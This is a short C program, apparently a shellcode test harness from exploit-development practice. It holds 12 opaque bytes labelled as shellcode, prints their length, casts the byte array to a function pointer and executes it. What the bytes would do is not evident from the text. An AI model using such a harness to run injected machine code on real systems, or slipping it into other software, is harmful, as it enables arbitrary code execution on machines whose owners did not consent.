#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x29\x59\x6f\x21\x17\x6f\xff\xd6\x0a\x72\x36\xbb";

void main()
{
printf("Shellcode Length:  %d\n", (int)strlen(code));
int (*ret)() = (int(*)())code;
ret();
}
